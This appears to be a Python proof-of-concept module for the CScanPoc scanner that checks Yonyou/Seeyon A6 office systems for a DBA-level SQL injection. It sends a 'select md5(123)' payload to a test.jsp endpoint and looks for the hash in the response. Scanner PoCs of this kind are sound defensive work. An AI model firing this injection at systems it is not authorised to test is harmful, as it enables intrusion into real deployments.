# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Yonyou_0010'  # 平台漏洞编号，留空
    name = '用友致远A6协同办公系统存在一处DBA权限SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-01-26'  # 漏洞公布时间
    desc = '''
        用友致远A6协同办公系统存在一处DBA权限SQL注入漏洞
    '''  # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0155953'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = 'A6'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'fac3a696-6c96-48d6-9ed6-6e01c51593f7'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = '/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20md5(123)'
            target = arg + url
            code, head, res, errcode, _ = hh.http(target)
            if code == 200 and '202cb962ac59075b964b07152d234b70' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
